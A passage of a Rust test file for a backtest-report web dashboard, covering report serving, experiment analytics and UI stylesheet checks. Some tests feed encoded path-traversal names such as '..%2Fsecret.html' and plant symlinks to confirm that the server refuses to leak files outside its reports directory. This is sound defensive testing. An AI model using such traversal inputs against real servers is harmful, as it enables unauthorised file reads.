        shell.contains(r#""/reports?token=" + encodeURIComponent(TOKEN)"#),
        "the link has to hand the token over: sessionStorage is per tab"
    );
}

/// `read_to_string` follows symlinks, so a name-only allowlist plus a link
/// planted in the reports directory read as "any file this process can open".
#[cfg(unix)]
#[tokio::test]
async fn a_symlinked_report_is_refused_and_never_listed() {
    let (dir, _router, db) = setup(false).await;
    std::fs::write(dir.path().join("secret.html"), "<p>secret</p>").unwrap();
    let router = router_with_reports(&db, dir.path(), &[("ok.html", "<p>ok</p>")]);
    let reports = dir.path().join("reports");
    // Both names pass `safe_report_name`; only refusing to follow the link
    // keeps them from being served.
    std::os::unix::fs::symlink(dir.path().join("secret.html"), reports.join("link.html")).unwrap();
    std::os::unix::fs::symlink(dir.path(), reports.join("up.html")).unwrap();

    for name in ["link.html", "up.html"] {
        let (status, body) = get_html(&router, &format!("/report/{name}")).await;
        assert_eq!(status, StatusCode::NOT_FOUND, "{name} was served: {body}");
        assert!(!body.contains("secret"), "{name} followed the link: {body}");
    }

    // The listing has to agree with what the route will actually serve, or it
    // advertises reports that 404.
    let (_status, json) = get_json(&router, "/api/reports").await;
    let names: Vec<&str> = json["reports"]
        .as_array()
        .unwrap()
        .iter()
        .map(|value| value.as_str().unwrap())
        .collect();
    assert_eq!(names, vec!["ok.html"]);

    // The real file is still served.
    let (status, body) = get_html(&router, "/report/ok.html").await;
    assert_eq!(status, StatusCode::OK);
    assert!(body.contains("ok"));
}

#[tokio::test]
async fn a_missing_report_is_a_404_not_a_500() {
    let (dir, _router, db) = setup(false).await;
    let router = router_with_reports(&db, dir.path(), &[]);
    let (status, _) = get_html(&router, "/report/nothing.html").await;
    assert_eq!(status, StatusCode::NOT_FOUND);
}

#[tokio::test]
async fn report_names_that_could_escape_the_directory_are_refused() {
    let (dir, _router, db) = setup(false).await;
    // A file the traversal attempts would reach if the check were weak.
    std::fs::write(dir.path().join("secret.html"), "<p>secret</p>").unwrap();
    let router = router_with_reports(&db, dir.path(), &[("ok.html", "<p>ok</p>")]);

    for attempt in [
        "/report/..%2Fsecret.html",
        "/report/%2e%2e%2fsecret.html",
        "/report/..",
        "/report/notes.txt",
        "/report/sub%2Fok.html",
    ] {
        let (status, body) = get_html(&router, attempt).await;
        assert_ne!(status, StatusCode::OK, "{attempt} was served: {body}");
        assert!(!body.contains("secret"), "{attempt} leaked a file");
    }

    // The legitimate name still works.
    let (status, _) = get_html(&router, "/report/ok.html").await;
    assert_eq!(status, StatusCode::OK);
}

#[tokio::test]
async fn a_database_without_reports_says_so_rather_than_failing() {
    let (_dir, router, _db) = setup(false).await;
    let (status, json) = get_json(&router, "/api/reports").await;
    assert_eq!(status, StatusCode::OK);
    assert!(json["reports"].as_array().unwrap().is_empty());
}

#[tokio::test]
async fn experiments_project_trial_ledger_rows_and_attention_priority() {
    let (_dir, _router, db) = setup(false).await;
    db.create_fork(
        "bt-alpha-0000-run",
        Some("backtest run alpha-0000-run".into()),
        None,
        serde_json::Map::new(),
    )
    .await
    .unwrap();
    let fork = db.open_fork("bt-alpha-0000-run").await.unwrap();
    let config_schema = Arc::new(Schema::new(vec![
        Field::new("run_id", DataType::Utf8, false),
        Field::new("trial_digest", DataType::Utf8, false),
        Field::new("config_json", DataType::Utf8, false),
    ]));
    fork.create_table("bt_config", config_schema.clone(), TableOptions::default())
        .await
        .unwrap();
    fork.write(
        "bt_config",
        vec![
            RecordBatch::try_new(
                config_schema,
                vec![
                    Arc::new(StringArray::from(vec!["alpha-0000-run"])),
                    Arc::new(StringArray::from(vec!["semantic-digest"])),
                    Arc::new(StringArray::from(vec![
                        r#"{"metadata":{"study_id":"alpha","trial":0,"phase":"run","parameters":{"fee":0.01},"needs_decision":true}}"#,
                    ])),
                ],
            )
            .unwrap(),
        ],
        WriteOptions::default(),
    )
    .await
    .unwrap();
    let run_schema = Arc::new(Schema::new(vec![
        Field::new("run_id", DataType::Utf8, false),
        Field::new("warnings", DataType::Utf8, true),
        Field::new("realized_pnl", DataType::Float64, false),
        Field::new("final_cash", DataType::Float64, false),
        Field::new("fills", DataType::Int64, false),
    ]));
    fork.create_table("bt_run", run_schema.clone(), TableOptions::default())
        .await
        .unwrap();
    fork.write(
        "bt_run",
        vec![
            RecordBatch::try_new(
                run_schema,
                vec![
                    Arc::new(StringArray::from(vec!["alpha-0000-run"])),
                    Arc::new(StringArray::from(vec![Some("thin coverage")])),
                    Arc::new(Float64Array::from(vec![12.5])),
                    Arc::new(Float64Array::from(vec![1012.5])),
                    Arc::new(Int64Array::from(vec![3])),
                ],
            )
            .unwrap(),
        ],
        WriteOptions::default(),
    )
    .await
    .unwrap();

    let router = router_for(&db, false);
    let (status, body) = get_json(&router, "/api/experiments").await;
    assert_eq!(status, StatusCode::OK);
    let experiments = body["experiments"].as_array().unwrap();
    assert_eq!(experiments.len(), 1);
    assert_eq!(experiments[0]["id"], "alpha");
    assert_eq!(experiments[0]["priority"], 5);
    assert_eq!(experiments[0]["warning_count"], 1);
    let trial = &experiments[0]["trials"][0];
    assert_eq!(trial["trial"], 0);
    assert_eq!(trial["phase"], "run");
    assert_eq!(trial["status"], "warned");
    assert_eq!(trial["trial_digest"], "semantic-digest");
    assert_eq!(trial["metrics"]["realized_pnl"], 12.5);
    assert_eq!(trial["parameters"]["fee"], 0.01);
}

/// Minimal `bt_config` + `bt_run` pair so a fork reads as a finished trial.
async fn write_trial_head(fork: &Database, run_id: &str, digest: &str, starting_cash: f64) {
    let config_schema = Arc::new(Schema::new(vec![
        Field::new("run_id", DataType::Utf8, false),
        Field::new("trial_digest", DataType::Utf8, false),
        Field::new("config_json", DataType::Utf8, false),
    ]));
    fork.create_table("bt_config", config_schema.clone(), TableOptions::default())
        .await
        .unwrap();
    fork.write(
        "bt_config",
        vec![
            RecordBatch::try_new(
                config_schema,
                vec![
                    Arc::new(StringArray::from(vec![run_id])),
                    Arc::new(StringArray::from(vec![digest])),
                    Arc::new(StringArray::from(vec![
                        r#"{"metadata":{"study_id":"alpha"}}"#,
                    ])),
                ],
            )
            .unwrap(),
        ],
        WriteOptions::default(),
    )
    .await
    .unwrap();
    let run_schema = Arc::new(Schema::new(vec![
        Field::new("run_id", DataType::Utf8, false),
        Field::new("starting_cash", DataType::Float64, false),
        Field::new("realized_pnl", DataType::Float64, false),
    ]));
    fork.create_table("bt_run", run_schema.clone(), TableOptions::default())
        .await
        .unwrap();
    fork.write(
        "bt_run",
        vec![
            RecordBatch::try_new(
                run_schema,
                vec![
                    Arc::new(StringArray::from(vec![run_id])),
                    Arc::new(Float64Array::from(vec![starting_cash])),
                    Arc::new(Float64Array::from(vec![7.0])),
                ],
            )
            .unwrap(),
        ],
        WriteOptions::default(),
    )
    .await
    .unwrap();
}

async fn write_table(fork: &Database, name: &str, schema: SchemaRef, columns: Vec<ArrayRef>) {
    fork.create_table(name, schema.clone(), TableOptions::default())
        .await
        .unwrap();
    fork.write(
        name,
        vec![RecordBatch::try_new(schema, columns).unwrap()],
        WriteOptions::default(),
    )
    .await
    .unwrap();
}

/// The leaderboard's columns come from the result tables, not from guesses:
/// counts off `bt_orders`/`bt_fills`, win rate off `bt_positions`, and shape
/// off `bt_equity`. A Sharpe travels with what it was computed from.
#[tokio::test]
async fn trial_analytics_derive_counts_shape_and_reliability_from_result_tables() {
    let (_dir, _router, db) = setup(false).await;
    db.create_fork("bt-shape", None, None, serde_json::Map::new())
        .await
        .unwrap();
    let fork = db.open_fork("bt-shape").await.unwrap();
    write_trial_head(&fork, "shape-run", "digest-shape", 1000.0).await;

    let ts = |values: Vec<i64>| -> ArrayRef { Arc::new(TimestampNanosecondArray::from(values)) };

    write_table(
        &fork,
        "bt_orders",
        Arc::new(Schema::new(vec![
            Field::new("order_id", DataType::Utf8, false),
            Field::new("status", DataType::Utf8, false),
        ])),
        vec![
            Arc::new(StringArray::from(vec!["o1", "o2", "o3"])),
            Arc::new(StringArray::from(vec!["filled", "filled", "rejected"])),
        ],
    )
    .await;
    write_table(
        &fork,
        "bt_fills",
        Arc::new(Schema::new(vec![Field::new(
            "order_id",
            DataType::Utf8,
            false,
        )])),
        vec![Arc::new(StringArray::from(vec!["o1", "o2"]))],
    )
    .await;
    // One instrument ends net positive (5 realised + 1 settled), one negative.
    write_table(
        &fork,
        "bt_positions",
        Arc::new(Schema::new(vec![
            Field::new("instrument_id", DataType::Utf8, false),
            Field::new("realized_pnl", DataType::Float64, false),
            Field::new("settlement_pnl", DataType::Float64, true),
        ])),
        vec![
            Arc::new(StringArray::from(vec!["A", "B"])),
            Arc::new(Float64Array::from(vec![5.0, -3.0])),
            Arc::new(Float64Array::from(vec![Some(1.0), None])),
        ],
    )
    .await;
    write_table(
        &fork,
        "bt_equity",
        Arc::new(Schema::new(vec![
            Field::new("ts", DataType::Timestamp(TimeUnit::Nanosecond, None), false),
            Field::new("equity", DataType::Float64, false),
        ])),
        vec![
            ts(vec![0, 60_000_000_000, 120_000_000_000, 180_000_000_000]),
            Arc::new(Float64Array::from(vec![1000.0, 1010.0, 990.0, 1020.0])),
        ],
    )
    .await;

    let router = router_for(&db, false);
    let (status, body) = get_json(&router, "/api/experiments").await;
    assert_eq!(status, StatusCode::OK);
    let analytics = &body["experiments"][0]["trials"][0]["analytics"];

    assert_eq!(analytics["orders"], 3);
    assert_eq!(analytics["rejected"], 1);
    assert_eq!(analytics["fills"], 2);
    assert_eq!(analytics["instruments"], 2);
    assert_eq!(analytics["instruments_won"], 1);
    assert_eq!(analytics["win_rate"], 0.5);

    // 1010 -> 990 is the worst peak-to-trough fall.
    let drawdown = analytics["max_drawdown"].as_f64().unwrap();
    assert!(
        (drawdown - (990.0 / 1010.0 - 1.0)).abs() < 1e-12,
        "drawdown was {drawdown}"
    );
    // Return is measured against starting cash, not the curve's first point.
    let ret = analytics["return_pct"].as_f64().unwrap();
    assert!((ret - 2.0).abs() < 1e-9, "return was {ret}");
    assert_eq!(analytics["equity_points"], 4);
    assert_eq!(analytics["equity"].as_array().unwrap().len(), 4);

    // The Sharpe is annualised from the samples' own spacing, and says so.
    assert_eq!(analytics["sample_interval_ns"], 60_000_000_000i64);
    assert_eq!(analytics["sharpe_samples"], 3);
    assert_eq!(analytics["span_ns"], 180_000_000_000i64);
    assert!(analytics["sharpe"].as_f64().unwrap().is_finite());
    assert!(analytics.get("truncated").is_none());
}

/// A second fork carrying a digest that already exists is a served result,
/// not a second run, and the payload says which one it was.
#[tokio::test]
async fn a_repeated_trial_digest_is_marked_reused_rather_than_run_twice() {
    let (_dir, _router, db) = setup(false).await;
    for name in ["bt-first", "bt-second"] {
        db.create_fork(name, None, None, serde_json::Map::new())
            .await
            .unwrap();
        let fork = db.open_fork(name).await.unwrap();
        write_trial_head(
            &fork,
            name.trim_start_matches("bt-"),
            "shared-digest",
            100.0,
        )
        .await;
    }

    let router = router_for(&db, false);
    let (_status, body) = get_json(&router, "/api/experiments").await;
    let trials = body["experiments"][0]["trials"].as_array().unwrap();
    assert_eq!(trials.len(), 2);
    let reused: Vec<bool> = trials
        .iter()
        .map(|trial| trial["reused"].as_bool().unwrap())
        .collect();
    assert_eq!(
        reused.iter().filter(|flag| **flag).count(),
        1,
        "exactly the later fork is the reuse, got {reused:?}"
    );
}

const INDEX_HTML: &str = include_str!("../assets/index.html");

/// Both of the UI's silent colour bugs were invalid CSS that a browser drops
/// without complaint: variables used before they were defined, and a money
/// colour that lost the cascade to `table.grid td`. Neither shows up in a
/// screenshot review as anything but "the colour looks off", so they are
/// asserted here instead.
#[test]
fn every_css_variable_the_stylesheet_uses_is_defined() {
    let defined: std::collections::HashSet<&str> = INDEX_HTML
        .match_indices("--")
        .filter_map(|(at, _)| {
            let rest = &INDEX_HTML[at..];
            let end = rest.find(':')?;
            let name = &rest[..end];
            // A definition is `--name:` with nothing but the name between.
            name[2..]
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || c == '-')
                .then_some(name)
        })
        .collect();
    let mut missing: Vec<&str> = INDEX_HTML
        .match_indices("var(--")
        .filter_map(|(at, _)| {
            let rest = &INDEX_HTML[at + 4..];
            let end = rest.find([')', ','])?;
            Some(&rest[..end])
        })
        .filter(|name| !defined.contains(name))
        .collect();
    missing.sort_unstable();
    missing.dedup();
    assert!(
        missing.is_empty(),
        "these CSS variables are used but never defined, so every declaration \
         using them is dropped: {missing:?}"
    );
}

/// `table.grid td { color: var(--text) }` is specificity (0,1,2). A bare
/// `.metric-negative` is (0,1,0) and loses, which rendered every P&L white.
#[test]
fn money_colours_out_specify_the_table_cell_colour() {
    for class in ["metric-positive", "metric-negative"] {
        let selector = format!("table.grid td.{class}");
        assert!(
            INDEX_HTML.contains(&selector),
            "`.{class}` must also be written as `{selector}` or it loses the \
             cascade to `table.grid td` and renders as plain text colour"
        );
    }
}

/// An absent attribute must be absent. `setAttribute(name, null)` writes the
/// string "null", and for a boolean attribute that means permanently on --
/// which silently ticked every checkbox and selected every dropdown option.
#[test]
fn the_element_helper_skips_null_attributes() {
    assert!(
        INDEX_HTML.contains("else if (v != null && v !== false) el.setAttribute(k, v);"),
        "h() must skip null/false attributes rather than stringifying them"
    );
}
